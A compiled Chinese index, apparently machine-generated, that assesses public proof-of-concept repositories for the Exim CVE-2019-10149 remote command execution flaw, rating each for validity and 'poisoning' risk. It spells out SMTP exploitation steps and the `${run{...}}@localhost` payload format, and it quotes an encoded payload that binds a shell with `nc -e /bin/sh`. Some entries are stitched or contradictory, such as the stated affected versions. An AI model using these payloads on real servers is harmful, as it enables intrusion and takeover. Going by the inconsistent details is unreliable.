提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

